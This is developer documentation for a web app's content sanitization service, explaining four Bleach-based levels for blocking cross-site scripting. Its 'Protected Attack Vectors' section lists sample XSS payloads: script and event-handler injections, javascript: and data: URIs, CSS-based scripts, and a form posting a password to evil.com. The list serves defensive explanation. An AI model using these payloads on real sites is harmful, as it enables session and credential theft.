# Content Sanitization

## Overview

NikNotes implements comprehensive content sanitization using the **Bleach library** to protect against Cross-Site Scripting (XSS) attacks. All user-generated content is sanitized before storage and display.

## Why Content Sanitization?

**XSS (Cross-Site Scripting)** attacks occur when malicious users inject executable scripts into web pages viewed by other users. This can lead to:

- Session hijacking
- Cookie theft
- Credential phishing
- Malware distribution
- Website defacement

Content sanitization prevents these attacks by:

1. **Removing dangerous HTML tags** (script, iframe, object, etc.)
2. **Stripping event handlers** (onclick, onload, onerror, etc.)
3. **Blocking malicious protocols** (javascript:, data:, etc.)
4. **Allowing safe formatting** where appropriate

## Sanitization Levels

NikNotes uses four sanitization levels based on content sensitivity:

### 1. STRICT (No HTML)

**Use for:** Usernames, traveler names, destinations, item names

- **Allowed tags:** None
- **Behavior:** All HTML tags removed, text content preserved
- **Example:**

  ```python
  Input:  '<script>alert(1)</script>Paris'
  Output: 'alert(1)Paris'

  Input:  '<b>John</b> Smith'
  Output: 'John Smith'
  ```

### 2. BASIC (Simple Formatting)

**Use for:** Template names, short descriptions

- **Allowed tags:** `b`, `i`, `em`, `strong`, `u`, `br`
- **Example:**

  ```python
  Input:  '<b>Summer</b> Trip'
  Output: '<b>Summer</b> Trip'

  Input:  '<b>Bold</b><script>alert(1)</script>'
  Output: '<b>Bold</b>alert(1)'
  ```

### 3. STANDARD (Formatting + Lists)

**Use for:** Activity descriptions, general notes

- **Allowed tags:** `b`, `i`, `em`, `strong`, `u`, `br`, `p`, `ul`, `ol`, `li`
- **Example:**

```python
Input:  '<ul><li>Item 1</li><li>Item 2</li></ul>'
Output: '<ul><li>Item 1</li><li>Item 2</li></ul>'
```

### 4. RICH (Full Formatting + Links)

**Use for:** Special notes, detailed descriptions, item notes

- **Allowed tags:** `b`, `i`, `em`, `strong`, `u`, `br`, `p`, `ul`, `ol`, `li`, `a`, `span`
- **Allowed attributes:**
  - `a`: `href`, `title`
  - `span`: `class`
- **Allowed protocols:** `http`, `https`, `mailto`
- **Example:**

  ```python
  Input:  '<a href="https://embassy.com">Embassy</a>'
  Output: '<a href="https://embassy.com">Embassy</a>'

  Input:  '<a href="javascript:alert(1)">Bad</a>'
  Output: 'Bad'  # javascript: protocol blocked
  ```

## API Reference

### ContentSanitizer Class

Located in `src/services/sanitization_service.py`

#### Methods

```python
# Strict sanitization (no HTML)
sanitized = ContentSanitizer.sanitize_strict(text)

# Basic sanitization (simple formatting)
sanitized = ContentSanitizer.sanitize_basic(text)

# Standard sanitization (formatting + lists)
sanitized = ContentSanitizer.sanitize_standard(text)

# Rich sanitization (full formatting + links)
sanitized = ContentSanitizer.sanitize_rich(text)

# Email sanitization
email = ContentSanitizer.sanitize_email(email)

# URL sanitization
url = ContentSanitizer.sanitize_url(url)

# Bulk data sanitization
trip_data = ContentSanitizer.sanitize_trip_data(trip_dict)
item_data = ContentSanitizer.sanitize_item_data(item_dict)
```

### Custom Sanitization

```python
from src.services.sanitization_service import ContentSanitizer

# Custom tag/attribute configuration
sanitized = ContentSanitizer.sanitize_text(
    text,
    allowed_tags=['p', 'a', 'br'],
    allowed_attributes={'a': ['href']},
    strip=True  # Strip disallowed tags (vs. escape them)
)
```

## Integration Points

### User Registration

```python
# web_app.py - /register endpoint
raw_username = ContentSanitizer.sanitize_strict(request.form.get('username', ''))
raw_email = ContentSanitizer.sanitize_email(request.form.get('email', ''))
```

### Trip Creation

```python
# web_app.py - /trip/new endpoint
sanitized_destination = ContentSanitizer.sanitize_strict(data.get('destination', ''))
sanitized_notes = ContentSanitizer.sanitize_rich(data.get('special_notes', ''))
sanitized_travelers = [
    ContentSanitizer.sanitize_strict(traveler)
    for traveler in raw_travelers if traveler
]
```

### Packing Items

```python
# web_app.py - /api/trip/<trip_id>/item endpoint
sanitized_name = ContentSanitizer.sanitize_strict(data.get('name', ''))
sanitized_notes = ContentSanitizer.sanitize_rich(data.get('notes', ''))
```

## Protected Attack Vectors

The sanitization service protects against:

### 1. Script Injection

```html
<!-- Blocked -->
<script>
  alert("XSS");
</script>
<img src="x" onerror="alert(1)" />
<svg onload="alert(1)"></svg>
```

### 2. Event Handlers

```html
<!-- Blocked -->
<div onclick="malicious()">Click me</div>
<body onload="steal_cookies()">
  <a href="#" onmouseover="phishing()">Link</a>
</body>
```

### 3. Malicious Protocols

```html
<!-- Blocked -->
<a href="javascript:alert(1)">Link</a>
<iframe src="data:text/html,<script>alert(1)</script>"></iframe>
```

### 4. Frame Injection

```html
<!-- Blocked -->
<iframe src="https://evil.com/phishing">
  <object data="malicious.swf">
    <embed src="exploit.pdf" /></object
></iframe>
```

### 5. Form Injection

```html
<!-- Blocked -->
<form action="https://evil.com/steal">
  <input name="password" />
</form>
```

### 6. Style-based Attacks

```html
<!-- Blocked -->
<style>
  body {
    background: url("javascript:alert(1)");
  }
</style>
<link rel="stylesheet" href="javascript:alert(1)" />
```

## Security Considerations

### Defense in Depth

Content sanitization is ONE layer of security. NikNotes also implements:

- **Content Security Policy (CSP)** - Prevents execution of inline scripts
- **CSRF Protection** - Validates requests with tokens
- **Rate Limiting** - Prevents abuse
- **Authentication** - Controls access
- **Audit Logging** - Tracks all actions

### HTML Encoding

Bleach automatically encodes special characters:

```python
Input:  'Price: $100 & up'
Output: 'Price: $100 &amp; up'

Input:  'Formula: 5 < 10 > 3'
Output: 'Formula: 5 &lt; 10 &gt; 3'
```

### Text Content Preservation

**Important:** Bleach strips tags but **preserves text content**:

```python
Input:  '<script>alert(1)</script>Hello'
Output: 'alert(1)Hello'  # Tags removed, text remains
```

This is intentional behavior:

- ✅ **Prevents execution** - No script tags means no code execution
- ✅ **Preserves data** - User's text isn't lost
- ⚠️ **Not content filtering** - Use additional validation if needed

### When to Use Each Level

| Content Type   | Level               | Reason                                |
| -------------- | ------------------- | ------------------------------------- |
| Username       | STRICT              | No formatting needed, strict identity |
| Email          | STRICT + validation | Must be valid email format            |
| Destination    | STRICT              | Plain text sufficient                 |
| Traveler names | STRICT              | Plain text sufficient                 |
| Item names     | STRICT              | Plain text sufficient                 |
| Template name  | BASIC               | Allow simple emphasis                 |
| Activities     | STANDARD            | Lists and formatting helpful          |
| Special notes  | RICH                | Links to resources useful             |
| Item notes     | RICH                | Links to product pages helpful        |

## Testing

Run sanitization tests:

```bash
# All sanitization tests (63 tests)
pytest tests/test_sanitization.py -v

# Specific test class
pytest tests/test_sanitization.py::TestXSSAttackVectors -v

# With coverage
pytest tests/test_sanitization.py --cov=src.services.sanitization_service
```

Test coverage: **92%** (100 statements, 8 missed)

## Common Patterns

### Validating User Input

```python
# 1. Sanitize first
sanitized_input = ContentSanitizer.sanitize_strict(user_input)

# 2. Then validate
if not sanitized_input or len(sanitized_input) > 100:
    raise ValidationError("Invalid input")

# 3. Store sanitized value
user.name = sanitized_input
```

### Displaying User Content

```python
# In templates, content is already sanitized
# Flask auto-escapes by default, providing double protection
<div>{{ trip.destination }}</div>  <!-- Safe -->
<div>{{ trip.special_notes|safe }}</div>  <!-- Safe, allows HTML -->
```

### API Responses

```python
# Sanitization happens on INPUT, not output
# API returns already-sanitized data
return jsonify({
    'name': item.name,  # Already sanitized on creation
    'notes': item.notes  # Already sanitized on creation
})
```

## Best Practices

1. **Sanitize at the boundary** - Sanitize when data enters the system
2. **Choose appropriate level** - Use strictest level that meets requirements
3. **Test thoroughly** - Test with malicious inputs
4. **Document exceptions** - If skipping sanitization, document why
5. **Monitor for bypasses** - Review CSP violation reports
6. **Keep Bleach updated** - New attack vectors discovered regularly

## Compliance

Content sanitization helps meet security requirements for:

- **OWASP Top 10** - A3: Injection (XSS)
- **PCI DSS** - 6.5.7: Cross-site scripting
- **GDPR** - Article 32: Security of processing
- **SOC 2** - CC6.1: Logical and physical access controls
- **HIPAA** - § 164.308: Administrative safeguards

## References

- [Bleach Documentation](https://bleach.readthedocs.io/)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [Content Security Policy](./CSP_REPORTING.md)
- [Security Enhancements](./SECURITY_ENHANCEMENTS.md)
